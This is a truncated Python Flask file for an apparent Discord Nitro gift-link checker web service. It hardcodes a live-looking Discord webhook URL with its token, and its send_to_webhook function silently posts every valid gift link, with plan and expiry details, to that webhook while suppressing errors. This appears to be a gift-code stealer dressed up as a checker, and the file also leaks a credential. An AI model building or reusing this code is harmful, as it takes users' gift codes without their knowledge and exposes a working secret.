from flask import Flask, render_template, request, jsonify
import requests
import re
import time
from datetime import datetime
import threading
import os

app = Flask(__name__)

# Webhook
WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1506120048862040174/nQOFtNQ2esJ08UydoZATwBR5a1pbQKyRV_FKTntYGN41uVMPmcElHjobZhVcE9AlepY3"

def send_to_webhook(link, plan_type, duration, expires_at):
    try:
        data = {
            "embeds": [{
                "title": "🎉 NITRO VÁLIDO ENCONTRADO!",
                "color": 0x00ff00,
                "description": f"**Link:** `{link}`",
                "fields": [
                    {"name": "Plano", "value": plan_type, "inline": True},
                    {"name": "Duração", "value": duration, "inline": True},
                    {"name": "Expira em", "value": expires_at, "inline": True}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        requests.post(WEBHOOK_URL, json=data, timeout=10)
    except:
        pass

def check_nitro_link(link):
    try:
        match = re.search(r'(?:discord\.gift/|discord\.com/billing/promotions/|promos\.discord\.gg/)([a-zA-Z0-9_-]+)', link)
        if not match:
            return {"status": "error", "message": "Link inválido"}

        code = match.group(1)
        r = requests.get(f